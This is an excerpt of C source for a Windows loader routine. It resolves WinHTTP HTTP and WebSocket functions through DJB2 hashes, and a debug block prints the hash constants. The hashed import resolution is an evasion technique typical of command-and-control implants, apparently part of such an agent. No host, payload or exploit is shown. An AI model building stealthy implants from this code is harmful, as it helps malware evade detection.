...
BOOL ApiLoad()
{
	...
	if (ApiWin && hKernel32Module) {
		...
		HMODULE hWinHttpModule = ApiWin->LoadLibraryA(winhttp_c);
#if defined(DEBUG)  
		//#define HASH_FUNC_WINHTTPSETOPTION                   0x30bc8a97
		...
		ApiWin->printf("// WinHTTP Function Hashes\n");
		for (int i = 0; i < sizeof(winhttp_funcs) / sizeof(winhttp_funcs[0]); i++) {
			ULONG hash = Djb2A((PUCHAR)winhttp_funcs[i]);

			// 转换为大写  
			CHAR upper_name[50];
			int j = 0;
			while (winhttp_funcs[i][j] != '\0') {
				upper_name[j] = (winhttp_funcs[i][j] >= 'a' && winhttp_funcs[i][j] <= 'z')
					? winhttp_funcs[i][j] - 32 : winhttp_funcs[i][j];
				j++;
			}
			upper_name[j] = '\0';

			ApiWin->printf("#define HASH_FUNC_%s    0x%08x\n", upper_name, hash);
		}
#endif
#if defined(DEBUG)  
		if (hWinHttpModule) {
			ApiWin->printf("[DEBUG] winhttp.dll loaded at: %p\n", hWinHttpModule);
		}
		else {
			ApiWin->printf("[DEBUG] Failed to load winhttp.dll, error=%d\n", ApiWin->GetLastError());
		}
#endif  

		if (hWinHttpModule) {
			ApiWin->WinHttpOpen = (decltype(WinHttpOpen)*)GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPOPEN);
			ApiWin->WinHttpConnect = (decltype(WinHttpConnect)*)GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPCONNECT);
			ApiWin->WinHttpOpenRequest = (decltype(WinHttpOpenRequest)*)GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPOPENREQUEST);
			ApiWin->WinHttpSetOption = (decltype(WinHttpSetOption)*)GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPSETOPTION);
			ApiWin->WinHttpSendRequest = (decltype(WinHttpSendRequest)*)GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPSENDREQUEST);
			ApiWin->WinHttpReceiveResponse = (decltype(WinHttpReceiveResponse)*)GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPRECEIVERESPONSE);
			ApiWin->WinHttpQueryOption = (decltype(WinHttpQueryOption)*)GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPQUERYOPTION);
			ApiWin->WinHttpQueryHeaders = (decltype(WinHttpQueryHeaders)*)GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPQUERYHEADERS);
			ApiWin->WinHttpAddRequestHeaders = (decltype(WinHttpAddRequestHeaders)*)GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPADDREQUESTHEADERS);
			ApiWin->WinHttpQueryDataAvailable = (decltype(WinHttpQueryDataAvailable)*)GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPQUERYDATAAVAILABLE);
			ApiWin->WinHttpReadData = (decltype(WinHttpReadData)*)GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPREADDATA);
			ApiWin->WinHttpWebSocketCompleteUpgrade = (decltype(WinHttpWebSocketCompleteUpgrade)*)GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPWEBSOCKETCOMPLETEUPGRADE);
			ApiWin->WinHttpWebSocketSend = (decltype(WinHttpWebSocketSend)*)GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPWEBSOCKETSEND);
			ApiWin->WinHttpWebSocketReceive = (decltype(WinHttpWebSocketReceive)*)GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPWEBSOCKETRECEIVE);
			ApiWin->WinHttpWebSocketClose = (decltype(WinHttpWebSocketClose)*)GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPWEBSOCKETCLOSE);
			ApiWin->WinHttpCloseHandle = (decltype(WinHttpCloseHandle)*)GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPCLOSEHANDLE);
		}
	}
	else {
		return FALSE;
